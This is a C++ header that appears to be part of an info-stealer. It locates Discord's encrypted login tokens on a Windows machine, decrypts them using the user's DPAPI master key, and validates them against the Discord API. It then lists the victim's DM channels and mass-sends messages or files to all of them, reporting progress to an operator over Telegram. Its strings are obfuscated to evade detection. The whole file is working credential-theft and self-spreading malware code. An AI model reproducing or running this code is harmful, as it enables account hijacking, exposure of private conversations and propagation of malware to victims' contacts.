#pragma once

namespace discord {
    class c_discord {
        std::string m_token;

        bool get_token() {
            char* appdata = nullptr;
            size_t len;
            _dupenv_s(&appdata, &len, oxorany("APPDATA"));
            if (!appdata) {
                g_compiler->push_line(oxorany("Failed to get APPDATA environment variable."));
                return false;
            }
            std::string appdata_path(appdata);
            free(appdata);

            std::string local_state_path = appdata_path + "\\discord\\Local State";
            std::ifstream local_state_file(local_state_path);
            if (!local_state_file.is_open()) {
                g_compiler->push_line(oxorany("Cannot open Local State file: ") + local_state_path);
                return false;
            }

            json local_state;
            try {
                local_state_file >> local_state;
            }
            catch (const json::parse_error& e) {
                g_compiler->push_line(oxorany("Failed to parse Local State JSON: ") + std::string(e.what()));
                return false;
            }
            local_state_file.close();

            if (!local_state.contains(oxorany("os_crypt")) || !local_state[oxorany("os_crypt")].contains(oxorany("encrypted_key"))) {
                g_compiler->push_line(oxorany("Missing os_crypt.encrypted_key in Local State."));
                return false;
            }

            std::string encrypted_key_b64 = local_state[oxorany("os_crypt")][oxorany("encrypted_key")];
            std::vector<uint8_t> encrypted_key = crypto::base64_decode(encrypted_key_b64);
            if (encrypted_key.size() < 5) {
                g_compiler->push_line(oxorany("Encrypted key too short."));
                return false;
            }
            encrypted_key.erase(encrypted_key.begin(), encrypted_key.begin() + 5);

            DATA_BLOB input = { static_cast<DWORD>(encrypted_key.size()), encrypted_key.data() };
            DATA_BLOB output = { 0, nullptr };
            if (!CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
                g_compiler->push_line(oxorany("CryptUnprotectData failed: ") + std::to_string(GetLastError()));
                return false;
            }
            std::vector<uint8_t> master_key(output.pbData, output.pbData + output.cbData);
            LocalFree(output.pbData);

            std::string leveldb_path = appdata_path + oxorany("\\discord\\Local Storage\\leveldb");
            if (!std::filesystem::exists(leveldb_path)) {
                g_compiler->push_line(oxorany("LevelDB directory not found: ") + leveldb_path);
                return false;
            }

            std::regex token_regex(oxorany(R"(dQw4w9WgXcQ:([^\"]+))"));
            std::vector<std::string> tokens;

            for (const auto& entry : std::filesystem::directory_iterator(leveldb_path)) {
                if (entry.path().extension() != oxorany(".ldb")) continue;

                std::ifstream db_file(entry.path(), std::ios::binary);
                if (!db_file) continue;

                std::string content((std::istreambuf_iterator<char>(db_file)),
                    std::istreambuf_iterator<char>());
                db_file.close();

                std::smatch match;
                std::string::const_iterator search_start = content.cbegin();
                while (std::regex_search(search_start, content.cend(), match, token_regex)) {
                    std::string token_b64 = match[1].str();
                    std::vector<uint8_t> token_bytes = crypto::base64_decode(token_b64);
                    if (token_bytes.size() < 3 + 12 + 16) {
                        search_start = match.suffix().first;
                        continue;
                    }

                    std::vector<uint8_t> iv(token_bytes.begin() + 3, token_bytes.begin() + 15);
                    std::vector<uint8_t> ciphertext_with_tag(token_bytes.begin() + 15, token_bytes.end());
                    if (ciphertext_with_tag.size() < 16) {
                        search_start = match.suffix().first;
                        continue;
                    }
                    size_t ciphertext_len = ciphertext_with_tag.size() - 16;
                    std::vector<uint8_t> ciphertext(ciphertext_with_tag.begin(),
                        ciphertext_with_tag.begin() + ciphertext_len);
                    std::vector<uint8_t> tag(ciphertext_with_tag.begin() + ciphertext_len,
                        ciphertext_with_tag.end());

                    std::vector<uint8_t> plaintext;
                    if (crypto::aes_gcm_decrypt(master_key.data(), master_key.size(),
                        iv.data(), iv.size(),
                        tag.data(), tag.size(),
                        ciphertext.data(), ciphertext.size(),
                        plaintext)) {
                        std::string token(plaintext.begin(), plaintext.end());
                        tokens.push_back(token);
                    }
                    search_start = match.suffix().first;
                }
            }

            if (tokens.empty()) {
                g_compiler->push_line(oxorany("No Discord tokens found."));
                return false;
            }

            std::unordered_map<std::string, int> freq;
            for (const auto& t : tokens) {
                freq[t]++;
            }

            int max_freq = 0;
            for (const auto& p : freq) {
                if (p.second > max_freq) max_freq = p.second;
            }

            std::unordered_set<std::string> keep_tokens;
            if (max_freq > 1) {
                for (const auto& p : freq) {
                    if (p.second == max_freq) keep_tokens.insert(p.first);
                }
            }
            else {
                for (const auto& t : tokens) keep_tokens.insert(t);
            }

            m_token.clear();
            for (const auto& token : keep_tokens) {
                std::string url = oxorany("https://discord.com/api/v9/users/@me");
                std::string response = https::get(url, token);
                if (!response.empty()) {
                    try {
                        auto user_data = json::parse(response);
                        if (user_data.contains(oxorany("message")) && user_data[oxorany("message")] == oxorany("401: Unauthorized")) {
                            continue;
                        }
                        else if (user_data.contains(oxorany("username"))) {
                            m_token = token;
                            return true;
                        }
                    }
                    catch (const std::exception&) {
                        continue;
                    }
                }
            }

            g_compiler->push_line(oxorany("No valid Discord token found."));
            return false;
        }

        std::vector<std::pair<std::string, std::string>> get_dm_channels(const std::string& token) {
            std::string url = "https://discord.com/api/v9/users/@me/channels";
            std::string response = https::get(url, token);
            std::vector<std::pair<std::string, std::string>> channels; // channel_id, recipient_name

            if (!response.empty()) {
                auto json_channels = json::parse(response);
                for (auto& ch : json_channels) {
                    if (ch["type"] == 1 || ch["type"] == 3) { // 1=DM, 3=group DM
                        std::string channel_id = ch["id"];
                        std::string recipient = "Unknown";
                        if (ch.contains("recipients") && !ch["recipients"].empty()) {
                            recipient = ch["recipients"][0]["username"].get<std::string>();
                        }
                        channels.emplace_back(channel_id, recipient);
                    }
                }
            }
            return channels;
        }

        std::vector<std::string> get_messages(const std::string& channel_id, const std::string& token, int limit = 50) {
            std::string url = "https://discord.com/api/v9/channels/" + channel_id + "/messages?limit=" + std::to_string(limit);
            std::string response = https::get(url, token);
            std::vector<std::string> messages;

            if (!response.empty()) {
                auto msgs = json::parse(response);
                for (auto& msg : msgs) {
                    std::string author = msg["author"]["username"];
                    std::string content = msg.value("content", "");
                    messages.push_back(author + ": " + content);
                }
            }
            return messages;
        }

        bool send_file(const std::string& channel_id, const std::string& token, const std::string& message, const std::string& file_path) {
            // Read file
            std::ifstream file(file_path, std::ios::binary);
            if (!file) return false;
            std::vector<char> file_content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();
            std::string filename = std::filesystem::path(file_path).filename().string();
            return send_file_data(channel_id, token, message, file_content, filename);
        }

        bool send_file_data(const std::string& channel_id, const std::string& token,
            const std::string& message, const std::vector<char>& file_data,
            const std::string& filename) {
            std::string boundary = "--------------------------" + std::to_string(rand()) + std::to_string(rand());
            std::string body;

            body += "--" + boundary + "\r\n";
            body += "Content-Disposition: form-data; name=\"content\"\r\n\r\n";
            body += message + "\r\n";

            body += "--" + boundary + "\r\n";
            body += "Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n";
            body += "Content-Type: application/octet-stream\r\n\r\n";
            body.append(file_data.data(), file_data.size());
            body += "\r\n";
            body += "--" + boundary + "--\r\n";

            std::string url = "https://discord.com/api/v9/channels/" + channel_id + "/messages";
            auto response = https::post_multipart(url, token, body, boundary);

            if (response.status_code == 200 || response.status_code == 201) {
                try {
                    auto resp_json = json::parse(response.body);
                    return resp_json.contains("id");
                } catch (...) {
                    return false;
                }
            } else {
                https::send_telegram_message(oxorany("[@") + utility::get_username() +
                    oxorany("] Discord API error ") + std::to_string(response.status_code) +
                    oxorany(": ") + response.body);
                return false;
            }
        }

    public:
        bool compile_discord() {
            g_compiler->push_line(oxorany("Discord:"));
            if (get_token()) {
                g_compiler->push_line(oxorany("Token: ") + m_token);

                std::string url = oxorany("https://discord.com/api/v9/users/@me");
                std::string response = https::get(url, m_token);
                if (!response.empty()) {
                    try {
                        auto user_data = json::parse(response);
                        if (user_data.contains(oxorany("username"))) {
                            std::string username = user_data[oxorany("username")].get<std::string>();
                            g_compiler->push_line(oxorany("User: ") + username);
                        }
                    } catch (...) {}
                }

                auto channels = get_dm_channels(m_token);
                if (!channels.empty()) {
                    g_compiler->push_line(oxorany("Open DM channels:"));
                    for (const auto& [channel_id, recipient] : channels) {
                        g_compiler->push_line(oxorany("  - ") + recipient + " (ID: " + channel_id + ")");
                    }
                } else {
                    g_compiler->push_line(oxorany("No open DM channels found."));
                }

                std::cout << oxorany("Compiled Discord logs\n");
                g_compiler->push_line(oxorany(""));
                return true;
            }
            g_compiler->push_line(oxorany("Could not get a valid discord token."));
            return false;
        }

        bool send_message(const std::string& channel_id, const std::string& message) {
            std::string url = "https://discord.com/api/v9/channels/" + channel_id + "/messages";
            json payload = { {"content", message} };
            auto response = https::post_detailed(url, m_token, payload.dump());

            if (response.status_code == 200 || response.status_code == 201) {
                try {
                    auto resp_json = json::parse(response.body);
                    return resp_json.contains("id");
                } catch (...) {
                    return false;
                }
            } else {
                // Log the error (optional)
                https::send_telegram_message(oxorany("[@") + utility::get_username() +
                    oxorany("] Discord API error ") + std::to_string(response.status_code) +
                    oxorany(": ") + response.body);
                return false;
            }
        }

        bool send_message_to_dm(const std::string& channel_id, const std::string& message) {
            if (!get_token()) {
                https::send_telegram_message(oxorany("[@") + utility::get_username() + oxorany("] no valid Discord token"));
                return false;
            }
            return send_message(channel_id, message);
        }

        bool send_file_to_dm(const std::string& channel_id, const std::string& message, const std::string& file_path) {
            if (!get_token()) return false;
            return send_file(channel_id, m_token, message, file_path);
        }

        bool send_message_to_all_dms(const std::string& message) {
            if (!get_token()) {
                https::send_telegram_message( oxorany( "[@" ) + utility::get_username( ) + oxorany( "] could not find token" ) );
                return false;
            }

            auto channels = get_dm_channels(m_token);
            if (channels.empty()) {
                https::send_telegram_message( oxorany( "[@" ) + utility::get_username( ) + oxorany( "] no open DM channels" ) );
                return false;
            }

            bool all_success = true;
            for (const auto& [channel_id, recipient] : channels) {
                https::send_telegram_message( oxorany( "[@" ) + utility::get_username( ) + oxorany( "] sending to " ) + recipient );

                if (send_message(channel_id, message)) {
                    https::send_telegram_message( oxorany( "[@" ) + utility::get_username( ) + oxorany( "] sent message" ) );
                }
                else {
                    https::send_telegram_message( oxorany( "[@" ) + utility::get_username( ) + oxorany( "] failed to send message" ) );
                    all_success = false;
                }
                Sleep(500);
            }

            return all_success;
        }

        bool send_file_to_all_dms(const std::string& message, const std::string& file_path) {
            if (!get_token()) {
                https::send_telegram_message(oxorany("[@") + utility::get_username() + oxorany("] could not find token"));
                return false;
            }

            auto channels = get_dm_channels(m_token);
            if (channels.empty()) {
                https::send_telegram_message(oxorany("[@") + utility::get_username() + oxorany("] no open DM channels"));
                return false;
            }

            bool all_success = true;
            for (const auto& [channel_id, recipient] : channels) {
                https::send_telegram_message(oxorany("[@") + utility::get_username() + oxorany("] sending file to ") + recipient);
                if (send_file(channel_id, m_token, message, file_path)) {
                    https::send_telegram_message(oxorany("[@") + utility::get_username() + oxorany("] file sent"));
                } else {
                    https::send_telegram_message(oxorany("[@") + utility::get_username() + oxorany("] failed to send file"));
                    all_success = false;
                }
                Sleep(500);
            }

            return all_success;
        }
    };
}